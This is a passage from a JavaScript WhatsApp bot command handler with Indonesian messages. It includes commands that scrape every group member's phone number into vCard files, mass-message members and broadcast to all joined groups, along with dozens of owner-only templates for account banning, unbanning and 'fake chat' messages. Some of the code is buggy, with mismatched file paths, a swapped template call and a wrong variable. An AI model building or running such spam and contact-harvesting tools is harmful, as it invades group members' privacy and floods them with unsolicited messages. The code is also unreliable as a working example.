await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break
case "savecontactv1": {
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'google': {
                if (!text) return `Contoh : ${prefix + command} fatih arridho`
                if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
case 'gimage': {
                if (!text) return `Contoh : ${prefix + command} Akame`
                m.reply(mess.wait)
                if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    let buttons = [{
                        buttonId: `gimage ${text}`,
                        buttonText: {
                            displayText: '⌲ Next Image'
                        },
                        type: 1
                    }]
                    let buttonMessage = {
                        image: {
                            url: images
                        },
                        caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`,
                        footer: ntiktok,
                        buttons: buttons,
                        headerType: 4
                    }
                    Biiofc.sendMessage(m.chat, buttonMessage, {
                        quoted: fdoc
                    })
                })
            }
            break
case 'getcontact': case 'getkontak':
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await Biiofc.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Biiofc.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await Biiofc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Biiofc.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Biiofc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcvideo': case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await Biiofc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await Biiofc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Biiofc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
        break        
case 'alltotal':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const total = `
${totalban()}

${totalunban()}

${totalfakechat()}

Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(total)
break
case 'tools1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls1 = ` ${tools1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls1)
break
case 'tools2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls2 = ` ${tools2()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls2)
break
case 'cek-saldobri':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const saldooo = ` ${saldoo()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(saldooo)
break
case 'fakec1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const fakec = ` ${fakec1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(fakec)
break
//============================================//
case 'fakec2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tek = ` ${fakec2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(tek)
break
//============================================//
case 'fakec3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hade = ` ${fakec3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(hade)
break
//============================================//
case 'fakec4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const wtf = ` ${fakec4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(wtf)
break
//=======================================================//
//============================================//
case 'fakec5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const mmk = ` ${fakec5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(mmk)
break
//=======================================================//

//============================================//
case 'fakec6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const jan = ` ${fakec6()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(jan)
break
case 'fakec7':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lullu = ` ${fakec7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(lullu)
}
break
case 'fakec8':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const alfi = ` ${fakec8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(alfi)
}
break
case 'fakec9':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const amalia = ` ${fakec9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(amalia)
}
break
case 'fakec10':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ayg = ` ${fakec10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ayg)
}
break
case 'fakec11':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bubub = ` ${fakec11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(bubub)
}
break
case 'textunbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const vaga = ` ${textunbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(vaga)
break
case 'textunbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const aga = ` ${textunbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(aga)
break
case 'textunbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const naga = ` ${textunbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(naga)
break
case 'textunbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const woii = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(woii)
break
case 'textunbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sokasim = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(sokasim)
break
//=======================================================//
case 'textunbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const akakaka = ` ${textunbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(akakaka)

break
//=======================================================//
case 'textunbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const kopok = ` ${textunbanv7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kopok)

break
//=======================================================//
case 'textunbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tehyung = ` ${textunbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tehyung)

break
//=======================================================//
case 'textunbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahhyan = ` ${textunbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahhyan)

break
//=======================================================//
case 'textunbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const yamete = ` ${textunbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yamete)

break
//=======================================================//
case 'textunbanv11':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const suuu = ` ${textunbanv11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(suuu)

break
//=======================================================//
case 'textunbanv12':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const huuuu = ` ${textunbanv12()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(huuuu)

break
//=======================================================//
case 'textunbanv13':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const gaje = ` ${textunbanv13()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(gaje)

break
//=======================================================//
case 'textunbanv14':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const well = ` ${textunbanv14()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(well)

break
//=======================================================//
case 'textunbanv15':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lempo = ` ${textunbanv15()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lempo)

break
//=======================================================//
case 'textunbanv16':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const cok = ` ${textunbanv16()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cok)

break
//=======================================================//
case 'textunbanv17':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sayasuka = ` ${textunbanv17()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sayasuka)

break
//=======================================================//
case 'textunbanv18':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const oooooooo= ` ${textunbanv18()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(oooooooo)

break
//=======================================================//
case 'textunbanv19':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const omaaavaaaaaaaa = ` ${textunbanv19()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(omaaavaaaaaaaa)

break
//=======================================================//
case 'textunbanv20':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bykepo = ` ${textunbanv20()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bykepo)

break
//=======================================================//
case 'textunbanv21':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const unbannned = ` ${textunbanv21()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(unbannned)

break
case 'textbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sploer = ` ${textbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sploer)

break
//=======================================================//
case 'textbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ban = ` ${textbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ban)

break
//=======================================================//
case 'textbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const masuk = ` ${textbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(masuk)

break
//=======================================================//
case 'textbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const banned = ` ${textbanv4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(banned)

break
//=======================================================//
case 'textbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const car = ` ${textbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(car)

break
//=======================================================//
case 'textbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const capek = ` ${textbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(capek)

break
//=======================================================//
case 'textbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hem = `${textbanv7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(hem)

break
//=======================================================//
case 'textbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lelah = ` ${textbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lelah)

break
//=======================================================//
case 'textbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const pem = ` ${textbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(pem)

break
//=======================================================//
case 'textbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahh = ` ${textbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahh)

break
case "topupgame" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [id, zone, kode] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: id,data_zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_Trx id : ${res.data.data.trxid}_*\n*_Id/zone: ${res.data.data.data}(${res.data.data.zone})_*\n*_Layanan : ${res.data.data.service}_*\n*_Status : ${res.data.data.status}_*\n*_Harga : ${res.data.data.price}_*\n*_Saldo : ${res.data.data.balance}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
    }
break
case "maudeposit" : {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [method, quantity, sender] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/deposit',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'request',method: method,quantity: quantity,sender: sender}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 DEPOSIT 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 METODE: ${res.data.data.method}(${res.data.data.name})_*\n*_Harga : ${res.data.data.sender}_*\n*_》 Jumlah : ${res.data.data.amount}_*\n*_》 Kode Uniq : ${res.data.data.uniq}_*\n*_》 Fee : ${res.data.data.fee}_*\n*_》 Mendapatkan Jumblah : ${res.data.data.get_amount}_*\n*_》 Jumlah Pembayaran : ${res.data.data.pay_amount}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "list-sosmed": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'category');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/social-media', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.category))].join('\n');
    let message = `Gunakan .game nama gamenya untuk melihat list layanan.\nBerikut list game yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Sosmed-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.category}_\n_✨ Id: ${service.id}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "cekgame" : {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [game, id, zone] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-validation',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,game: game,id: id,zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 NICKNAME ${game} 」 ──*\n\n*_》 Id: ${res.data.data.id}_*\n*_》 zone : ${res.data.data.zone}_*\n*_》 Name : ${res.data.data.name}_*\n\n*_Note:Untuk melakukan cek id game silahkan ketik ${prefix}list-game id/zone_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "list-pascabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/postpaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "list-prabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/prepaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "topup" : case "paket" :{
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [nomer, kode] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: nomer}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 Nomer: ${res.data.data.data}_*\n*_》 Kode : ${res.data.data.code}_*\n*_》 Topup : ${res.data.data.service}_*\n*_》 status : ${res.data.data.status}_*\n*_》 Informasi : ${res.data.data.note}_*\n*_》 Jumblah : ${res.data.data.balance}_*\n*_》 Price : ${res.data.data.price}_*\n\n*_Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case 'friend':
case 'searchfriend':{

let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
XeonStickWait()
}, 1000)
setTimeout(() => {
reply('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Biiofc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
reply(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return reply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
	case 'fliptext': {
